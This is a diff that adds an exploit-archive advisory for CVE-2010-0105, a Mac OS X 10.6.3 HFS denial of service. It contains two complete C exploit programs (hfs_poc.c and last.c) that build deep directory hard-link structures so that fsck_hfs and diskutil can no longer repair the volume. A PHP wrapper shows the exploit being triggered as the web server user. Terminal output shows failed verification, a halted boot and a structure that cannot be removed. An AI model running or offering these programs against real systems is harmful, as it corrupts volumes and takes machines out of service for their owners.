@@ -1,0 +1,507 @@
+id: 11970
+date: 04/24/2010
+title: MacOS X 10.6.3 filesystem hfs Denial of Service Vulnerability
+author: n/a
+cves: 
+
+=============================================================
+MacOS X 10.6.3 filesystem hfs Denial of Service Vulnerability
+=============================================================
+
+[ MacOS X 10.6.3 filesystem hfs Denial of Service Vulnerability ]
+
+
+CVE: CVE-2010-0105
+Risk: Medium
+
+Affected Software:
+- - MacOS 10.6 (tested on 1062 and 1063)
+
+NOTE: Prior versions may also be affected.
+
+
+- --- 0.Description ---
+Mac OS is the trademarked name for a series of graphical user
+interface-based operating systems developed by Apple Inc. (formerly
+Apple Computer,  Inc.) for their Macintosh line of computer systems. The
+Macintosh user experience is credited with popularizing the graphical
+user interface. The original form of what Apple would later name the
+"Mac OS" was the integral and unnamed system software first introduced
+in 1984 with the original Macintosh, usually referred to simply as the
+System software.
+
+
+- --- 1. MacOS X 10.6.3 filesystem hfs Denial of Service ---
+The main problem exist in implementation of filesystem (hfs). MacOS X
+10.6.3 has default hfs filesystem, so the problem came, when we create a
+special structure with hardlinks.
+
+Interesting information is in wikipedia :
+
+http://en.wikipedia.org/wiki/Hard_link
+
+- ---
+...
+Most modern operating systems don't allow hard links on directories to
+prevent endless recursion. A notable exception to this is Mac OS X v10.5
+(Leopard) which uses hard links on directories for the Time Machine
+backup mechanism only.
+...
+- ---
+
+In 10.6 we can't use ln(1) command to create hardlink to directory
+(example: # ln C/C CX ). Anyway, we can use link(3) function and we
+don't need any special privileges! It hear nice to exploit it.. let's try
+
+To show this issue, we need use this program:
+( http://securityreason.com/achievement_exploitalert/15 )
+
+- --- hfs_poc.c ---
+/* 	Proof of Concept for CVE-2010-0105
+	MacOS X 10.6 hfs file system attack (Denial of Service)
+	by Maksymilian Arciemowicz from SecurityReason.com
+
+	http://securityreason.com/achievement_exploitalert/15
+	
+	NOTE:
+	
+	This DoS will be localized in phase
+	
+	Checking multi-linked directories
+
+	So we need activate it with line
+	
+		connlink("C/C","CX");
+
+	Now we need create PATH_MAX/2 directory tree to make overflow.
+
+	and we should get diskutil and fsck_hfs exit with sig=8
+	
+	~ x$ diskutil verifyVolume /Volumes/max2
+	Started filesystem verification on disk0s3 max2
+	Performing live verification
+	Checking Journaled HFS Plus volume
+	Checking extents overflow file
+	Checking catalog file
+	Checking multi-linked files
+	Checking catalog hierarchy
+	Checking extended attributes file
+	Checking multi-linked directories
+	Maximum nesting of folders and directory hard links reached
+	The volume max2 could not be verified completely
+	Error: -9957: Filesystem verify or repair failed
+	Underlying error: 8: POSIX reports: Exec format error
+	
+		
+*/
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/param.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+
+
+int createdir(char *name){
+	if(0!=mkdir(name,((S_IRWXU | S_IRWXG | S_IRWXO) & ~umask(0))| S_IWUSR
+|S_IXUSR)){
+		printf("Can`t create %s", name);
+		exit(1);}
+		else
+		return 0;	
+}
+
+int comein(char *name){
+	if(0!=chdir(name)){
+		printf("Can`t chdir in to %s", name);
+		exit(1);}
+		else
+		return 0;	
+}
+
+int connlink(a,b)
+char *a,*b;
+{
+	if(0!=link(a,b)){
+		printf("Can`t create link %s => %s",a,b);
+		exit(1);}
+		else
+		return 0;	
+}
+
+int main(int argc,char *argv[]){
+	
+ 	int level;
+	FILE *fp;
+	
+	if(argc==2) {
+		level=atoi(argv[1]);
+	}else{
+		level=512; //default
+	}
+	createdir("C"); //create hardlink
+	createdir("C/C"); //create hardlink
+	
+	connlink("C/C","CX"); //we need use to checking multi-linked directorie
+
+	comein("C");
+	
+	while(level--)
+			printf("Level: %i mkdir:%i chdir:%i\n",level,
+			createdir("C"),
+			comein("C"));		
+	
+	
+	printf("check diskutil verifyVolume /\n");
+	return 0;
+}
+
+- --- hfs_poc.c ---
+
+or use
+
+- --- last.c ---
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/param.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <err.h>
+#include <errno.h>
+#include <locale.h>
+
+/* function mkpath() from mkdir(1)/netbsd
+ * Copyright for mkdir.c (c) 1983, 1992, 1993
+ *	The Regents of the University of California.  All rights reserved.
+ *
+ * Redistribution and use in source and binary forms, with or without
+ * modification, are permitted provided that the following conditions
+ * are met:
+ * 1. Redistributions of source code must retain the above copyright
+ *    notice, this list of conditions and the following disclaimer.
+ * 2. Redistributions in binary form must reproduce the above copyright
+ *    notice, this list of conditions and the following disclaimer in the
+ *    documentation and/or other materials provided with the distribution.
+ * 3. Neither the name of the University nor the names of its contributors
+ *    may be used to endorse or promote products derived from this software
+ *    without specific prior written permission.
+ *
+ * THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND
+ * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+ * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
+PURPOSE
+ * ARE DISCLAIMED.  IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
+ * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
+CONSEQUENTIAL
+ * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
+ * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
+ * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
+STRICT
+ * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
+ * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
+ * SUCH DAMAGE.
+ */
+int mkpath(char *path, mode_t mode, mode_t dir_mode){
+	
+	struct stat sb;
+	char *slash;
+	int done,rv;
+
+	done=0;
+	slash=path;
+
+	for(;;){
+		slash += strspn(slash,"/");
+		slash += strcspn(slash,"/");
+		
+		done = (*slash=='\0');
+		*slash = '\0';	
+		
+		rv = mkdir(path, done ? mode : dir_mode);
+		if(rv < 0){
+			int sverrno;
+
+			sverrno = errno;
+			
+			if(stat(path,&sb)<0){
+				errno=sverrno;
+				warn("%s",path);
+				return -1;
+			}
+
+			if(!S_ISDIR(sb.st_mode)){
+				errno = ENOTDIR;
+				warn("%s",path);
+				return -1;
+			}
+		} else if (done){
+			if((mode & ~(S_IRWXU|S_IRWXG|S_IRWXO) != 0) && (chmod(path,mode)== -1)) {
+				warn("%s",path);
+				return -1;
+			}
+		}
+		
+		
+		if(done){
+			break;
+		}
+
+		*slash = '/';
+	}
+	
+	return 0;
+}
+
+int main(){
+	
+	char symn[]="CX\0";
+	char buff[]="C/C\0";
+	char *sym;
+		
+	FILE *fp;
+	
+	int level=0;
+	mode_t mode,dir_mode;
+
+	sym=malloc((strlen(buff)+strlen(symn)+2)*sizeof(char));
+	
+	mode = ((S_IRWXU | S_IRWXG | S_IRWXO) & ~umask(0));
+	dir_mode = mode | S_IWUSR |S_IXUSR;
+	
+	mkpath(buff,mode,dir_mode);
+	link(buff,symn); // to show somethink
+	
+
+	while(1) // Phase 0
+		if(0!=chdir(buff)){
+			printf("Phase 0 done\n");
+			break;
+		}
+		else printf("Next %i\n",level++);
+
+	strcpy(sym,buff);
+	strcat(sym,"/");
+	strcat(sym,symn);
+
+	for(int ax=level; ax<20000; ax++){ // we can change 20000
+		mkpath(buff,mode,dir_mode);
+				
+		fp=fopen(sym,"a");
+		link(sym,symn);
+		unlink(sym);
+		fclose(fp);
+
+		printf("Level: %i\n",ax);
+		
+		if(0!=chdir(buff)){
+			printf("Done");
+			break;
+		}
+	}
+	return 0;
+}
+- --- last.c ---
+
+The above program last.c, creates a structure:
+
+ C / C / C / C / C / C / C / ..
+ C / C / CX
+ C / C / C / C / CX
+ ...
+
+until maxopenfiles limit or ax<20000. But we don't need create so deep
+tree (example hfs_poc.c).
+To present last.c, we will use _www(70) user and apache child as a main
+process.
+
+127:hardstyle x$ pwd
+/Library/WebServer/Doc-uments/hardstyle
+127:hardstyle x$ ls -la
+total 40
+drwxr-xr-x  5 _www  _www    170 Apr  6 16:27 .
+drwxrwxr-x  7 root  admin   238 Apr  6 16:24 ..
+- -rwxr-xr-x  1 _www  _www   9672 Apr  6 16:27 last
+- -rw-r--r--@ 1 _www  _www   3361 Apr  6 16:27 last.c
+- -rw-r--r--@ 1 _www  _www     42 Apr  6 16:26 picz.php
+127:hardstyle x$ cat picz.php
+<?php
+	echo "<pre>";
+	system("./last");
+?>
+
+after requesting to picz.php
+
+127:hardstyle x$ ls -la
+total 40
+drwxr-xr-x  7 _www  _www    238 Apr  6 16:29 .
+drwxrwxr-x  7 root  admin   238 Apr  6 16:24 ..
+drwxr-xr-x  3 _www  _www    102 Apr  6 16:29 C
+drwxr-xr-x  4 _www  _www    136 Apr  6 16:29 CX
+- -rwxr-xr-x  1 _www  _www   9672 Apr  6 16:27 last
+- -rw-r--r--@ 1 _www  _www   3361 Apr  6 16:27 last.c
+- -rw-r--r--@ 1 _www  _www     42 Apr  6 16:26 picz.php
+
+apache child has created C directory and CX hardlink.
+
+Programs such as:
+- - fsck_hfs
+- - diskutil
+- - "First Aid"
+- - etc
+
+are not able to repair the partition where is the directory "CX".
+
+127:hardstyle x$ diskutil verifyVolume /
+Started filesystem verification on disk0s1 mac
+Performing live verification
+Checking Journaled HFS Plus volume
+Checking extents overflow file
+Checking catalog file
+Checking multi-linked files
+Checking catalog hierarchy
+Checking extended attributes file
+Checking multi-linked directories
+Maximum nesting of folders and directory hard links reached
+The volume mac could not be verified completely
+Error: -9957: Filesystem verify or repair failed
+Underlying error: 8: POSIX reports: Exec format error
+
+diskutil has exit with signal 8.
+
+If an attacker can trigger fsck on restart server, the computer
+automatically turns off with below result:
+
+- ---
+...
+** Checking multi-linked directories
+  Maximum nesting of folders and directory hard links reached
+** The volume mac could not be verified completely
+/dev/rdisk0s1 (hfs) EXITED WITH SIGNAL 8
+fsck failed!
+Kext loading now disabled.
+Kext unloading now disabled.
+Kext autounloading now disabled.
+Can`t get kextd port.
+syncing disks... Killing all processes
+
+continuing
+done
+CPU halted
+- ---
+
+This example has been created with -3000 fts level. so we don't need
+create a very deepth tree (min ~512).
+
+let's try remove C and CX directory (created by last.c).
+
+xs-Mac:hardstyle x$ sudo rm -rf C
+rm: C: Directory not empty
+xs-Mac:hardstyle x$ sudo rm -rf CX
+xs-Mac:hardstyle x$
+
+we can't use rm(1) to simple remove C directory (exploit - last.c). We
+need divide this process for a few phases.
+It is not easy to delete the directory C, however some relationships can
+completely prevent it. Let's look at the mechanism maxopenfiles and try
+execute "last" a several times.
+
+- --- Run 0 ---
+...
+Next 8138
+Next 8139
+Phase 0 done
+Level: 8140
+Level: 8141
+Level: 8142
+Done
+...
+- --- Run 0 ---
+- --- Run 1 ---
+...
+Next 8141
+Next 8142
+Phase 0 done
+Level: 8143
+Done
+...
+- --- Run 1 ---
+- --- Run 2 ---
+...
+Next 8141
+Next 8142
+Phase 0 done
+Level: 8143
+Level: 8144
+Done
+...
+- --- Run 2 ---
+- --- Run 3 ---
+...
+Next 8140
+Next 8141
+Phase 0 done
+Level: 8142
+Done
+...
+- --- Run 3 ---
+
+Irregular call to chdir(3) function, is the result of restrictions
+maxopenfiles at the time.
+
+So multiple execution of last.c, prevents our struct before destroing.
+How deep will come our program, depends on the number of open files on
+the system.
+The use of entropy in establishing the structure, can completely
+prevent, the removal of a defective structure.
+
+Let's see what google know about
+
+"Maximum nesting of folders and directory hard links reached"
+
+http://www.google.pl/#hl=pl&source=hp&q="Maximum+nesting+of+folders+and+directory+hard+links+reached"
+
+Nobody has ever complained of similar problems.
+
+Let's look at:
+...
+	if (dfs.depth >= DIRLINK_DFS_MAX_DEPTH) {
+		fsckPrint(gptr->context, E_DirHardLinkNesting);
+		if (fsckGetVerbosity(gptr->context) >= kDebugLog) {
+			print_dfs(&dfs);
+		}
+		gptr->CatStat |= S_LinkErrNoRepair;
+		retval = E_DirHardLinkNesting;
+	}
+...
+
+where
+
+...
+/* Assuming that the name of a directory is single byte, the maximum depth
+ * of a directory hierarchy that can accommodate in PATH_MAX will be
+ * PATH_MAX/2.  Note that catalog hierarchy check puts limitation of 100
+ * on the maximum depth of a directory hierarchy.
+ */
+#define DIRLINK_DFS_MAX_DEPTH 	PATH_MAX/2
+...
+
+When we overskip PATH_MAX/2, interesting line is:
+
+		gptr->CatStat |= S_LinkErrNoRepair;
+
+The user _www is able to give flag S_LinkErrNoRepair :)
+
+
+- --- 2. Fix ---
+
+Currently not available.
+The last vulnerability CVE-2009-0689 was removed in version 10.6.3
+(after 9 months). So we have to wait
+
+
+
+
+#  0day.today [2023-03-24]  #
